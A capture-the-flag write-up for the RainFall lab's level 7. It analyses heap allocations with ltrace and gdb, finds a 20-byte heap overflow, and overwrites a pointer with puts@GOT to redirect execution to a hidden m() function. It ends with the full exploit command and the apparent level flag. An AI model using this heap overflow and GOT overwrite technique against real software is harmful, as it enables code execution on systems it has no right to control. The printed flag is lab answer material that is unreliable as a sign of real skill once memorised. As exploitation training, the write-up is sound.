Level 7
-------
1) 
level7@RainFall:~$ ./level7 787 878
~~
from this we can say that the program take 2 arguments argv[1] & argv[2]

2) 

After checking the functions we have using "GDB info functions" we can see that there is a hiden function called m()

SO we need to execute m()

3) after using ltrace, we can see the output:

level7@RainFall:~$ ltrace ./level7 
__libc_start_main(0x8048521, 1, 0xbffff804, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

So we have 4 heap allocations.

Heap layout:
-----------
0x804a008  struct A
0x804a018  buffer A
0x804a028  struct B
0x804a038  buffer B

structA
   |
   +--> bufferA

structB
   |
   +--> bufferB

4) 

Understanding the structure

Example: movl $0x1,(%eax) => Meaning: *(ptr1) = 1

Next instruction: mov something, 4(%eax)
Meaning: *(ptr1 + 4) = something

So memory layout becomes:

ptr1
+0 : int
+4 : pointer

Which corresponds to:

struct node
{
    int value;
    char *buffer;
};

We infer the structure from how memory is used.

HEAP MEMORY

ptr1
0x0804a008
+------------------+
| 1                |
+------------------+
| ptr2             |
+------------------+

ptr2
0x0804a018
+------------------+
| user data        |
| (argv[1])        |
+------------------+

ptr3
0x0804a028
+------------------+
| 2                |
+------------------+
| ptr4             |
+------------------+

ptr4
0x0804a038
+------------------+
| user data        |
| (argv[2])        |
+------------------+

5) 

level7@RainFall:~$ ltrace ./level7 PATTERN

__libc_start_main(0x8048521, 2, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "PATTERN")                    = 0x0804a018
strcpy(0x0804a038, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++


First strcpy()
--------------

strcpy(0x0804a018, "PATTERN") meaning strcpy(buffer1, argv[1])
So "PATTERN" is copied into: buffer1

Memory becomes:

0x0804a018

P
A
T
T
E
R
N
\0

Since "PATTERN" is 7 characters + null = 8 bytes, it fits exactly.

So no overflow happens here.

Second strcpy()
---------------

Now we see: strcpy(0x0804a038, NULL

This means the program executed: strcpy(buffer2, argv[2])

But: argv[2] = NULL

because we only passed one argument.

So the call becomes: strcpy(0x0804a038, NULL) Which is invalid.

strcpy tries to read from NULL → crash.

6) let's find the overflow offset

level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4
__libc_start_main(0x8048521, 2, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

strcpy(0x37614136, NULL <unfinished ...>

This is supposed to be: buffer2 pointer

But now it's corrupted by our input.

So the program is trying to execute: strcpy( corrupted_pointer , argv[2] )

which causes the crash.

After checking the position of our input it's : 6Aa7 located at position 21 and the pointer start at byte 20
So we overwrite 20 bytes

7) 

We want to overwrite the pointer with: puts@GOT

Found in gdb: 0x08049928

Little endian: \x28\x99\x04\x08


First argument payload "A"*20 + "\x28\x99\x04\x08" This overwrites: node2->buffer = puts@GOT


Second argument payloadq


Second strcpy will write: argv[2] → node2->buffer
But we changed the pointer to: puts@GOT

So we write: address of m() which is: 0x080484f4

Little endian: \xf4\x84\x04\x08


8) The solution

./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')


5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1772734122
